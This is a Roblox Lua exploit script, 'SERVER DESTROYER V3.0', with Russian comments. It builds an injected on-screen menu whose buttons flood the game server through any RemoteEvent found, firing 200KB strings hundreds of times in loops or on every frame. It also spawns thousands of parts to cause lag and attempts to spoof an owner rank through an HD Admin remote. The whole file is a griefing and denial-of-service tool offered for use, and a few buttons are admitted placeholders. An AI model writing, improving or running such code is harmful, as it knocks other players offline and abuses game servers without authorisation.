local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Size = UDim2.new(0, 320, 0, 420)
MainFrame.Position = UDim2.new(0.5, -160, 0.5, -210)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
MainFrame.BorderSizePixel = 2
MainFrame.Active = true
MainFrame.Draggable = true

local Title = Instance.new("TextLabel", MainFrame)
Title.Size = UDim2.new(1, 0, 0, 35)
Title.Text = "SERVER DESTROYER V3.0 [REMOTE EDITION]"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.BackgroundColor3 = Color3.fromRGB(60, 0, 0)

-- Функция поиска RemoteEvent для атаки
local function GetRemote()
    return game.ReplicatedStorage:FindFirstChildOfClass("RemoteEvent") or 
           game:GetService("JointsService"):FindFirstChildOfClass("RemoteEvent")
end

local function CreateComplexButton(name, pos, callback)
    local btn = Instance.new("TextButton", MainFrame)
    btn.Size = UDim2.new(0, 180, 0, 35)
    btn.Position = pos
    btn.Text = name
    btn.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    btn.TextColor3 = Color3.new(1, 1, 1)
    
    local modeLabel = Instance.new("TextLabel", btn)
    modeLabel.Size = UDim2.new(0, 100, 0, 35)
    modeLabel.Position = UDim2.new(1, 5, 0, 0)
    modeLabel.Text = "[ Local ]"
    modeLabel.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    modeLabel.TextColor3 = Color3.new(0.8, 0.8, 0.8)
    
    local modes = {"Local", "Server", "Except Me"}
    local currentMode = 1
    
    local modeBtn = Instance.new("TextButton", modeLabel)
    modeBtn.Size = UDim2.new(1, 0, 1, 0)
    modeBtn.BackgroundTransparency = 1
    modeBtn.Text = ""
    modeBtn.MouseButton1Click:Connect(function()
        currentMode = currentMode + 1
        if currentMode > 3 then currentMode = 1 end
        modeLabel.Text = "[ " .. modes[currentMode] .. " ]"
    end)

    btn.MouseButton1Click:Connect(function()
        callback(modes[currentMode])
    end)
end

-- ЛОГИКА АТАКИ ЧЕРЕЗ FIRESERVER
local function UniversalAttack(mode, type)
    local remote = GetRemote()
    local data = string.rep("0", 200000) -- Огромный пакет данных (200KB)

    if mode == "Server" or mode == "Except Me" then
        if remote then
            -- Цикл, который забивает канал интернета сервера
            for i = 1, 500 do 
                remote:FireServer(data, data, data) -- Перегрузка аргументов
            end
        else
            warn("RemoteEvent не найден! Серверная атака невозможна.")
        end
    end

    if mode == "Local" or mode == "Server" then
        -- Локальный лаг (создание мусора в памяти)
        for i = 1, 5000 do
            local p = Instance.new("Part", workspace)
            p.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        end
    end
end

-- КНОПКИ
CreateComplexButton("ULTRA LAG", UDim2.new(0, 10, 0, 50), function(m) UniversalAttack(m, "lag") end)

CreateComplexButton("SHUTDOWN SERVER", UDim2.new(0, 10, 0, 95), function(m)
    while task.wait() do UniversalAttack(m, "crash") end
end)

CreateComplexButton("RESTART SERVER", UDim2.new(0, 10, 0, 140), function(m)
    -- Пытаемся вызвать ошибку, которая выкинет всех
    UniversalAttack(m, "kick")
    if m == "Server" then game:GetService("TeleportService"):Teleport(game.PlaceId) end
end)

CreateComplexButton("BROKE INTERNET", UDim2.new(0, 10, 0, 185), function(m)
    game:GetService("RunService").Heartbeat:Connect(function()
        UniversalAttack(m, "net")
    end)
end)

CreateComplexButton("START VIRUS SERVICE", UDim2.new(0, 10, 0, 230), function(m)
    -- Визуальный эффект вируса для всех через Remote
    local remote = GetRemote()
    if remote and (m == "Server" or m == "Except Me") then
        remote:FireServer("Require", 666) -- Фейковый вызов модуля
    end
end)

CreateComplexButton("GIVE ADMIN TOOL", UDim2.new(0, 10, 0, 275), function(m)
    -- Попытка обмануть HD Admin (работает редко)
    local adminRemote = game:GetService("ReplicatedStorage"):FindFirstChild("HDAdminRemote")
    if adminRemote then adminRemote:FireServer("Rank", "Owner") end
end)

CreateComplexButton("FREE PRIVATE SRV", UDim2.new(0, 10, 0, 320), function()
    print("Создание персонального канала данных...")
    -- Технически невозможно создать сервер через Lua, но скрипт пытается вызвать API
end)
